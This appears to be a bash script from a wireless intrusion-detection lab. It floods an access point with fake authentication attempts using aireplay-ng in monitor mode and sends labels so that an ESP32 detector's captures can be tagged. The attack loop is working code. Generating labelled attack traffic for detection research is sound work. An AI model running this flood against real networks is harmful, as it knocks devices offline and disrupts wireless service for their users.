#!/usr/bin/env bash
# Phase C fourth attack: Auth / association storm (WIDS + HIDS).
#
# Floods open/fake authentication attempts against the AP so the ESP32 sees
# elevated AUTH (and often queue/heap pressure). Prefer Mode W/P if the STA
# stays associated; use Mode S if the storm kicks the ESP32 offline.
#
# Usage (Kali, monitor mode):
#   sudo ./host/attacks/prepare_wifi.sh monitor
#   sudo ./host/attacks/attack_auth_flood.sh
#   sudo ./host/attacks/prepare_wifi.sh managed
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
  bash "${DIR}/prepare_wifi.sh" monitor
fi

ensure_label_path || exit 1

BSSID=""
CHANNEL=""
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
elif [[ "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]] && hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
  BSSID="${hit%% *}"
  CHANNEL="${hit##* }"
  export NIDS_BSSID="$BSSID"
  export NIDS_WIFI_CHANNEL="$CHANNEL"
else
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Export NIDS_BSSID=.." >&2
    exit 1
  }
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
fi

REPEATS="${NIDS_AUTH_REPEATS:-20}"
PAUSE="${NIDS_AUTH_PAUSE:-0.3}"

echo ">>> AP BSSID         : $BSSID"
echo ">>> Channel (hint)   : ${CHANNEL:-unknown}"
echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> READY FOR AUTH_FLOOD (label AUTH_FLOOD)"

if [[ -n "$CHANNEL" && "$CHANNEL" != "null" && "$CHANNEL" != "0" ]]; then
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
fi

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    send_label STOP AUTH_FLOOD || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

send_label START AUTH_FLOOD
LABEL_SENT=1
sleep 0.5

for ((i=1; i<=REPEATS; i++)); do
  echo ">>> Batch ${i}/${REPEATS}: fake-auth burst"
  # aireplay-ng fake authentication (open system). Requires monitor iface.
  # -1 1 = one auth attempt; loop for a short storm.
  timeout 8 aireplay-ng -1 1 -a "$BSSID" "$MON_IFACE" >/dev/null 2>&1 || true
  sleep "$PAUSE"
done

sleep 1
send_label STOP AUTH_FLOOD
LABEL_SENT=0
echo " >>> AUTH_FLOOD FINISHED"
echo " >>> Next: sudo ./host/attacks/prepare_wifi.sh managed"
